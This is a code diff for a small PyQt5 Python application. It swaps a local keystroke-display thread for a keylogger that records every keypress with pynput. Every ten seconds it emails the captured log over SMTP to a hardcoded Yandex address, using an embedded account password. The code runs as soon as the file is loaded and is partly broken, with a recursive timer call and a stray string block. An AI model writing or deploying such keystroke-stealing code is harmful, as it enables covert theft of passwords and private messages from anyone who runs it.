@@ -1,35 +1,9 @@
 import sys
+import threading
 from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QLineEdit
-from PyQt5.QtCore import QObject, pyqtSignal
-from pynput import keyboard
-from threading import Thread
-
-class Communicate(QObject):
-    textChanged = pyqtSignal(str)
-
-class KeyloggerThread(Thread):
-    def __init__(self, text_edit, search_edit, communicator):
-        super().__init__()
-        self.text_edit = text_edit
-        self.search_edit = search_edit
-        self.communicator = communicator
-
-    def run(self):
-        def on_press(key):
-            try:
-                if key.char is not None:
-                    self.communicator.textChanged.emit(key.char)
-            except AttributeError:
-                if key == keyboard.Key.space:
-                    self.communicator.textChanged.emit(" ")
-
-        def on_release(key):
-            if key == keyboard.Key.esc:
-                return False
-
-        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-            listener.join()
-
+import pynput.keyboard
+import smtplib
+""""
     def filter_words(self, char):
         text = self.text_edit.toPlainText()
         search_text = self.search_edit.text()
@@ -38,7 +12,38 @@ class KeyloggerThread(Thread):
             self.text_edit.setPlainText(filtered_text)
         else:
             self.text_edit.insertPlainText(char)
+"""
+log = ""
+def calbackFunc(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + str(key)
+    except:
+        pass
+    print(log)
+keyloggerListener = pynput.keyboard.Listener(on_press=calbackFunc)
 
+def sendEmail(email,password,message):
+    emailServer = smtplib.SMTP("smtp.yandex.com",587)
+    emailServer.starttls()
+    emailServer.login(email,password)
+    emailServer.sendmail(email,email,message)
+    emailServer.quit()
+def threadFunc():
+    global log
+    sendEmail("drewbarrymore34@yandex.com","ngmlkeguhqwwvcju",log.encode('utf-8'))
+    log = ""
+    timerObj = threading.Timer(10,threadFunc())
+    timerObj.start()
+
+with keyloggerListener:
+    threadFunc()
+    keyloggerListener.join()
 def main():
     app = QApplication(sys.argv)
     window = QMainWindow()
@@ -50,18 +55,12 @@ def main():
     text_edit.resize(300, 150)
     text_edit.setEnabled(False)
     text_edit.setStyleSheet("color: red;")
+    text_edit.setPlainText(log)
 
     search_edit = QLineEdit(window)
     search_edit.move(50, 20)
     search_edit.resize(300, 20)
     search_edit.setStyleSheet("color: blue;")
-
-    communicator = Communicate()
-
-    keylogger_thread = KeyloggerThread(text_edit, search_edit, communicator)
-    communicator.textChanged.connect(keylogger_thread.filter_words)
-
-    keylogger_thread.start()
 
     window.show()
     sys.exit(app.exec_())
